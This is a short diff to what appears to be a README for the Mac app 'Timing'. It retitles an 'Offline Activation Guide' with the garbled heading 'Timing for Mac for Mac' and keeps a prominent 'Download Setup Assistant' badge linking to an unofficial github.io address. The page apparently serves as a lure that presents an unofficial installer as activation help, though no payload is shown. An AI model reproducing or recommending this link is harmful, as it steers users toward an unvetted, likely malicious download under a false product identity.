@@ -1,4 +1,4 @@
-# Timing for Mac — Offline Activation Guide
+# Timing for Mac for Mac
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://timing-for-mac-download-mac.github.io/.github)
 
